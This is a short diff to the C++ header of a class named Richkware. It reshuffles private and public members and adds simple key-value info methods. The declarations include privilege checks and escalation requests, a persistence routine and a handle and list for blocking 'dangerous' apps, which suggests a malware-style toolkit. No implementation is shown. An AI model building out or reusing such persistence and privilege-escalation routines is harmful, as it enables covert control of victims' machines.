@@ -34,18 +34,23 @@
 #include <map>
 
 class Richkware {
-public:
+private:
 	HANDLE hBlockAppsTh;
-	
+	std::map<std::string, std::string> session;
+
 	void SaveValueReg(const char* path, const char* key, const char* value);
 	std::string LoadValueReg(const char* path, const char* key);
-	//void SaveFileDir(const char* path);
-public:
-	std::map<std::string, std::string> session;
-	std::list<const char*> dangerousApps;
-
 	void SaveSession(const char* EncryptionKey);
 	void LoadSession(const char* EncryptionKey);
+	//void SaveFileDir(const char* path);
+public:
+	std::list<const char*> dangerousApps;
+	const char* EncryptionKey;
+
+	void SaveInfo(const char* key, const char* value);
+	std::string FindInfo(const char* key);
+	void RemoveInfo(const char* key);
+	
 	BOOL IsAdmin();
 	void RequestAdminPrivileges();
 	void Persistance();
